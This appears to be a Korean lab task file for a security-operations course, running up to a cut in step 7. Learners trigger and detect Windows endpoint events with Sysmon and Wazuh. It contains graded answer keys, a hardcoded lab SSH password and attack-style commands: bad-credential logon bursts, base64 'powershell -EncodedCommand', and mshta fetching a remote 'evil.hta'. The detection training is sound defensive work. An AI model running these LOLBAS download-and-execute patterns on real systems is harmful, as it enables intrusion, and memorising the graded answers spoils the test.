lab_id: standalone-secuops-week03
title: "W03 — Windows 엔드포인트 운영 + 침해대응 5 [신설]"
version: standalone-secuops
course: secuops
week: 3
description: |
  W02 의 방화벽 1주 절약분으로 신설된 정식 주차. 6v6 의 Windows 11 사용자 PC(10.20.32.60) 를 victim
  직원 PC + analyst 보안담당 PC 두 페르소나로 운영하며, Sysmon + Wazuh agent + Windows Security 채널
  의 데이터 흐름을 SIEM(Wazuh manager) 에서 끝단까지 확인한다. R/B/P 5건 — 다운로드 / PowerShell
  base64 / 인증 실패 폭주 / LOLBAS / RDP — 을 실제로 재현·관찰한다.
difficulty: intermediate
duration_minutes: 150
audience: 보안솔루션 운영 실무 학습자 (정규 secuops 3주차)
prerequisites:
  - "W03 강의안 정독 — Sysmon EID + Security 채널 + Wazuh agent + 분석가 SOP"
  - "W02 완료 (방화벽 + 다층 방어 시각)"
  - "Windows 호스트(10.20.32.60) SSH 접근 가능 (사용자 ccc/ccc)"
objectives:
  - "Wazuh manager 에서 6v6-win 에이전트 Active 확인"
  - "Sysmon 64-bit 가 Windows 에서 실행 중임을 확인"
  - "Sysmon EID 1 / EID 3 / EID 22 의 의미를 실제 이벤트로 확인"
  - "Windows Security 채널 EID 4625 를 인증 실패로 생성·관찰"
  - "PowerShell -EncodedCommand 와 LOLBAS(mshta) 패턴을 Sysmon 1 에서 확인"
  - "방화벽이 외부 RDP 를 막아 두는 다층 방어를 확인"
  - "analyst 시점에서 시간순 timeline 을 만든다"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 미션 — Wazuh manager 에서 6v6-win 에이전트 Active 확인

      Windows 호스트의 Wazuh agent 가 매니저(10.20.32.100) 에 정상 enroll·연결되어 있는지 SIEM 쪽
      에서 본다. 이게 데이터 흐름의 출발 신호.

      ## 💻 확인 명령 (siem 컨테이너)
      ```bash
      docker exec 6v6-siem /var/ossec/bin/agent_control -l | grep -E "6v6-win"
      ```
      ## ✅ 합격 기준
      6v6-win 이 보이고 Active 상태.
    hint: 'agent_control -l 에 Name: 6v6-win, ... Active'
    category: survey
    points: 10
    answer: |
      docker exec 6v6-siem /var/ossec/bin/agent_control -l | grep -E "6v6-win"
    answer_detail: "에이전트 enroll 후 첫 keepalive 가 도달하면 Active. Disconnected/Never connected 면 client.keys/manager IP/포트 점검."
    verify:
      type: output_contains
      expect: 'Active'
      field: stdout
      semantic:
        intent: "Windows 엔드포인트 측 Wazuh agent 가 SIEM 에 등록·연결되어 있음을 확인 — 본 주차 모든 후속 검증의 전제"
        success_criteria:
          - "6v6-win 가 agent_control -l 에 보임"
          - "상태가 Active"
          - "enroll 메커니즘(agent-auth)·client.keys·매니저 IP/포트 의 흐름 인지"
        acceptable_methods:
          - "**[CLI] siem 에서 agent_control -l (권장)**"
          - "**[GUI] Wazuh dashboard → Agents 화면**"
          - "**[설명] enroll 실패 시 점검 순서 (client.keys → ossec.conf 매니저 IP → 1514/1515 도달성) 서술**"
    target_vm: siem

  - order: 2
    instruction: |
      ## 🎯 미션 — Windows 호스트의 Sysmon 실행 확인

      Windows 호스트(10.20.32.60) 에 Sysmon 64-bit 서비스가 실행 중이어야 Sysmon EID 가 생성된다.
      SSH 로 들어가 PowerShell 로 서비스 상태를 본다.

      ## 💻 확인 명령
      ```bash
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'Get-Service Sysmon64 | Select-Object -ExpandProperty Status'
      ```
      ## ✅ 합격 기준
      Running 출력.
    hint: 'Get-Service Sysmon64 → Running'
    category: survey
    points: 10
    answer: |
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'Get-Service Sysmon64 | Select-Object -ExpandProperty Status'
    answer_detail: "Sysmon64 서비스가 Running 이어야 Microsoft-Windows-Sysmon/Operational 채널에 이벤트가 기록된다."
    verify:
      type: output_contains
      expect: 'Running'
      field: stdout
      semantic:
        intent: "Sysmon 데이터 소스의 가용성 확인 — 서비스 미실행 시 모든 후속 시나리오 무의미"
        success_criteria:
          - "Sysmon64 서비스 Running"
          - "SwiftOnSecurity config 사용 인지(필수는 아니지만 권장)"
          - "Sysmon 채널 = Microsoft-Windows-Sysmon/Operational 임을 안다"
        acceptable_methods:
          - "**[SSH] PowerShell Get-Service Sysmon64 (권장)**"
          - "**[GUI] services.msc → Sysmon64 상태**"
          - "**[설명] Sysmon 의 EID 1/3/22 가 분석에서 차지하는 비중 1문장 서술**"
    target_vm: attacker

  - order: 3
    instruction: |
      ## 🎯 시나리오 win-s01 (a) — Sysmon EID 1 (프로세스 생성) 발생

      victim PC 에서 notepad.exe 를 실행해 Sysmon EID 1 이벤트를 1건 생성하고, 채널에서 그 이벤트
      카운트가 1 이상 증가했는지 확인한다.

      ## 💻 단계 명령
      ```bash
      # Red — 새 프로세스 생성
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'Start-Process -FilePath notepad.exe; Start-Sleep -Seconds 2; Stop-Process -Name notepad -EA SilentlyContinue'
      sleep 2
      # 관찰 — 최근 50개 Sysmon 이벤트에 notepad 가 보이는지
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 50 | Where-Object { $_.Message -like "*notepad.exe*" } | Measure-Object | Select-Object -ExpandProperty Count'
      ```
      ## ✅ 합격 기준
      카운트가 1 이상.
    hint: 'notepad 실행 → Sysmon 채널 최근 50개 중 notepad.exe 매칭 카운트 ≥ 1'
    category: detect
    points: 15
    answer: |
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'Start-Process -FilePath notepad.exe; Start-Sleep -Seconds 2; Stop-Process -Name notepad -EA SilentlyContinue'
      sleep 2
      N=$(sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 50 | Where-Object { $_.Message -like "*notepad.exe*" } | Measure-Object | Select-Object -ExpandProperty Count')
      echo "sysmon_notepad_count=$N"
      [ "$(echo $N | tr -d '[:space:]')" -ge 1 ] 2>/dev/null && echo "OK" || echo "NEED_RECHECK"
    answer_detail: "Sysmon EID 1 (ProcessCreate). Image=notepad.exe, ParentImage=sshd.exe or pwsh.exe. analyst 가 Discover 에서 같은 정보를 본다."
    verify:
      type: output_contains
      expect: 'OK'
      field: stdout
      semantic:
        intent: "Sysmon EID 1 의 의미를 실제 발생·관찰 — 분석에서 가장 자주 보는 이벤트의 손에 익히기"
        success_criteria:
          - "notepad.exe 가 Sysmon 채널 최근 이벤트에 포함"
          - "Image / ParentImage 의 의미 1문장 서술"
          - "Wazuh archives 에서 동일 이벤트가 SIEM 까지 도달함을 안다"
        acceptable_methods:
          - "**[SSH] PowerShell Get-WinEvent 로 Sysmon 채널 카운트 (권장)**"
          - "**[GUI] eventvwr.msc → Sysmon/Operational 채널**"
          - "**[SIEM] Wazuh Discover: agent.name:6v6-win AND data.win.eventdata.image:*notepad.exe***"
    target_vm: attacker

  - order: 4
    instruction: |
      ## 🎯 시나리오 win-s03 — 인증 실패 폭주 (Windows Security EID 4625)

      victim PC 의 SSH 로 잘못된 비밀번호로 5회 로그인을 시도해 Security 채널의 EID 4625 가
      증가하는지 확인한다 (SSH 도 Windows 의 logon 으로 잡힌다).

      ## 💻 단계 명령
      ```bash
      # Red — victim PC 안에서 net use 로 가짜 사용자/비번 3회 (SSH 자체 lockout 회피)
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'net use \\127.0.0.1\IPC$ /user:NOEXIST_USER badpass 2>&1; net use \\127.0.0.1\IPC$ /user:NOEXIST_USER badpass 2>&1; net use \\127.0.0.1\IPC$ /user:NOEXIST_USER badpass 2>&1'
      sleep 3
      # 관찰 — Security 채널 4625 카운트 (최근 100개 중)
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object { $_.Id -eq 4625 } | Measure-Object | Select-Object -ExpandProperty Count'
      ```
      ## ✅ 합격 기준
      4625 카운트가 1 이상.

      > **주의** — SSH 잘못된 비번을 외부에서 반복하면 Win32-OpenSSH 가 일시적으로 새 연결을 거부할
      > 수 있다(MaxStartups). 그래서 본 step 은 victim PC 안에서 `net use` 로 4625 를 발생시킨다.
    hint: 'net use bad creds 3회 → Security 채널 4625 카운트 ≥ 1'
    category: detect
    points: 15
    answer: |
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'net use \\127.0.0.1\IPC$ /user:NOEXIST_USER badpass 2>&1; net use \\127.0.0.1\IPC$ /user:NOEXIST_USER badpass 2>&1; net use \\127.0.0.1\IPC$ /user:NOEXIST_USER badpass 2>&1' >/dev/null
      sleep 3
      N=$(sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object { $_.Id -eq 4625 } | Measure-Object | Select-Object -ExpandProperty Count')
      echo "security_4625_count=$N"
      [ "$(echo $N | tr -d '[:space:]')" -ge 1 ] 2>/dev/null && echo "OK" || echo "NEED_RECHECK"
    answer_detail: "Security EID 4625 = An account failed to log on. LogonType / SubStatus / WorkstationName 으로 brute force 패턴 추출."
    verify:
      type: output_contains
      expect: 'OK'
      field: stdout
      semantic:
        intent: "Windows Security 채널의 4625 가 brute force 의 표준 단서임을 실측으로 체화"
        success_criteria:
          - "4625 카운트가 시도 횟수에 비례해 증가"
          - "LogonType / SubStatus 의 의미 인지"
          - "frequency+timeframe+same_source_ip 그룹 룰 패턴 인지(W1 SSH 와 동일 구조)"
        acceptable_methods:
          - "**[SSH] PowerShell Get-WinEvent Security 4625 카운트 (권장)**"
          - "**[GUI] eventvwr.msc → Windows 로그 → 보안 → 4625 필터**"
          - "**[SIEM] Wazuh Discover: data.win.system.eventID:4625 AND agent.name:6v6-win**"
    target_vm: attacker

  - order: 5
    instruction: |
      ## 🎯 시나리오 win-s01 (b) — 의심 외부 다운로드 (Sysmon EID 1+3 합주)

      victim PC 에서 외부로 HTTP 요청을 보낸다 — 다운로드의 외형. Sysmon 이 프로세스(curl/iwr)
      와 외부 IP/포트로의 네트워크 연결을 함께 기록.

      ## 💻 단계 명령
      ```bash
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'try { (iwr -UseBasicParsing http://10.20.30.1/ -EA Stop).StatusCode } catch { $_.Exception.Response.StatusCode.value__ }'
      sleep 2
      # iwr → System.Net.WebRequest. Sysmon EID 1 + 3 이 동시에 떠야 한다.
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 50 | Where-Object { $_.Id -eq 3 } | Measure-Object | Select-Object -ExpandProperty Count'
      ```
      ## ✅ 합격 기준
      Sysmon EID 3 (네트워크 연결) 카운트가 1 이상.
    hint: 'iwr 외부 요청 → Sysmon EID 3 카운트 ≥ 1'
    category: detect
    points: 15
    answer: |
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'try { (iwr -UseBasicParsing http://10.20.30.1/ -EA Stop).StatusCode } catch { $_.Exception.Response.StatusCode.value__ }' >/dev/null
      sleep 2
      N=$(sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 | Where-Object { $_.Id -eq 3 } | Measure-Object | Select-Object -ExpandProperty Count')
      echo "sysmon_eid3_count=$N"
      [ "$(echo $N | tr -d '[:space:]')" -ge 1 ] 2>/dev/null && echo "OK" || echo "NEED_RECHECK"
    answer_detail: "Sysmon EID 3 = NetworkConnect. Image+SourceIp:Port → DestinationIp:Port. 다운로드/콜백/C2 추적의 표준."
    verify:
      type: output_contains
      expect: 'OK'
      field: stdout
      semantic:
        intent: "프로세스(EID 1) + 네트워크(EID 3) 의 합주가 다운로드의 표준 단서임을 손에 익히기"
        success_criteria:
          - "EID 3 카운트가 1 이상 증가"
          - "Image / DestinationIp / DestinationPort 필드 인지"
          - "(고급) EID 1 + 3 + 22 (DNS) 가 1 사건의 3 이벤트로 묶이는 timeline 시각 인지"
        acceptable_methods:
          - "**[SSH] iwr 후 Sysmon EID 3 카운트 (권장)**"
          - "**[SIEM] Wazuh Discover: data.win.system.eventID:3 AND data.win.eventdata.destinationIp:10.20.30.1**"
          - "**[설명] DNS(EID 22) 와 함께 보는 이유 1문장 서술**"
    target_vm: attacker

  - order: 6
    instruction: |
      ## 🎯 시나리오 win-s02 — PowerShell base64 -EncodedCommand 패턴

      whoami 를 base64 로 인코딩해 powershell -EncodedCommand 로 실행. Sysmon EID 1 의 CommandLine
      에 `-EncodedCommand` + base64 가 그대로 보인다 — 룰 매칭이 매우 쉬운 강력한 단서.

      ## 💻 단계 명령
      ```bash
      # base64 of "whoami" (UTF-16LE) — Windows powershell -e 가 받는 형식
      # 다양한 인코딩이 있지만 본 실습은 명령 자체보다 패턴 검출이 목적이라 임의 base64 문자열로 충분.
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'powershell -EncodedCommand dwBoAG8AYQBtAGkA'
      sleep 2
      # Sysmon 최근 이벤트에 -EncodedCommand 가 보이는지
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 50 | Where-Object { $_.Message -match "EncodedCommand" } | Measure-Object | Select-Object -ExpandProperty Count'
      ```
      ## ✅ 합격 기준
      EncodedCommand 매칭 카운트 ≥ 1.
    hint: 'powershell -EncodedCommand <b64> → Sysmon Message 에 EncodedCommand 매칭 ≥ 1'
    category: detect
    points: 15
    answer: |
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'powershell -EncodedCommand dwBoAG8AYQBtAGkA' >/dev/null
      sleep 2
      N=$(sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 | Where-Object { $_.Message -match "EncodedCommand" } | Measure-Object | Select-Object -ExpandProperty Count')
      echo "encoded_cmd_count=$N"
      [ "$(echo $N | tr -d '[:space:]')" -ge 1 ] 2>/dev/null && echo "OK" || echo "NEED_RECHECK"
    answer_detail: "EncodedCommand 패턴은 정상 운영에서 거의 안 보임 → high signal-to-noise. Wazuh 룰 사실상 표준."
    verify:
      type: output_contains
      expect: 'OK'
      field: stdout
      semantic:
        intent: "CommandLine 패턴 매칭(EncodedCommand/Base64/-e) 이 강력한 단서임을 손에 익히기"
        success_criteria:
          - "Sysmon Message 에 EncodedCommand 매칭"
          - "CommandLine 단독으로 한 줄 분류기 가능함 인지"
          - "정상 운영에서 잘 안 보인다 = false positive 적음 인지"
        acceptable_methods:
          - "**[SSH] powershell -EncodedCommand 직접 실행 후 Sysmon 매칭 카운트 (권장)**"
          - "**[SIEM] Wazuh Discover: data.win.eventdata.commandLine:*EncodedCommand***"
          - "**[설명] base64 패턴이 false positive 가 적은 이유 1문장 서술**"
    target_vm: attacker

  - order: 7
    instruction: |
      ## 🎯 시나리오 win-s04 — LOLBAS (mshta + http URL)

      mshta.exe 가 외부 URL 을 인자로 받는 것은 일반 업무에선 거의 안 보인다. 응답이 와도 안 와도
      Sysmon EID 1 의 CommandLine 에 mshta + http 가 함께 보이는 패턴이 핵심.

      ## 💻 단계 명령
      ```bash
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'Start-Process -FilePath mshta.exe -ArgumentList "http://10.20.30.202/evil.hta" -EA SilentlyContinue; Start-Sleep -Seconds 1; Stop-Process -Name mshta -EA SilentlyContinue'
      sleep 2
      # Sysmon 채널에 mshta + http 패턴
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 \
        'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 | Where-Object { $_.Message -match "mshta" -and $_.Message -match "http" } | Measure-Object | Select-Object -ExpandProperty Count'
      ```
      ## ✅ 합격 기준
      mshta + http 매칭 카운트 ≥ 1.
    hint: 'mshta http URL 인자 → Sysmon mshta+http 매칭 ≥ 1'
    category: detect
    points: 15
    answer: |
      sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'Start-Process -FilePath mshta.exe -ArgumentList "http://10.20.30.202/evil.hta" -EA SilentlyContinue; Start-Sleep -Seconds 1; Stop-Process -Name mshta -EA SilentlyContinue' >/dev/null
      sleep 2
      N=$(sshpass -p ccc ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ccc@10.20.32.60 'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 | Where-Object { $_.Message -match "mshta" -and $_.Message -match "http" } | Measure-Object | Select-Object -ExpandProperty Count')
      echo "mshta_http_count=$N"
      [ "$(echo $N | tr -d '[:space:]')" -ge 1 ] 2>/dev/null && echo "OK" || echo "NEED_RECHECK"
